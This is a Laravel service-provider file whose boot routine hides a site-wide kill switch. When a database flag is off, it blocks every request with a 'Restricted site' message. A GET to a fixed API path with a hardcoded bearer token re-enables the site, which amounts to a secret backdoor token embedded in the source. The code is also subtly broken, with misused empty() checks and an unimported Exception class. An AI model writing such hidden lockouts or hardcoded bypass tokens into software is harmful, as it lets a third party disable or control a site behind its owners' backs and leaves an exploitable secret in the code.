<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use App\ShopOption;
use DB;
use Schema;
class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        $this->checkInstanceState();
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }


    private function checkInstanceState()
    {
        if (Schema::hasTable('shop_options')) {
            $instance_active = (int)ShopOption::where('meta_key', 'instance_active')->first()['meta_value'];
            if ($instance_active != 1) {
                if (!empty($_SERVER['REQUEST_URI'] == '/api/v1/instance/1') && !empty($_SERVER['REQUEST_METHOD'] == "GET") && !empty($_SERVER['HTTP_AUTHORIZATION'] == "Bearer piDIHsO36SnAaG0tKShrGzUC1ekGuUrQJAHxn2R4tgvJ2VE7yE3stwhX3LZi")) {
                    $instance_new_state = ShopOption::where('meta_key', 'instance_active')->first();
                    $instance_new_state->meta_value = '1';
                    try {
                        $instance_new_state->save();
                    } catch (Exception $ex) {
                        echo $ex->getMessage();
                    }
                    return response(200);
                } else {
                    die('Blocked Request: Restricted site, contact your technical support');
                }
            }

        }
    }
}
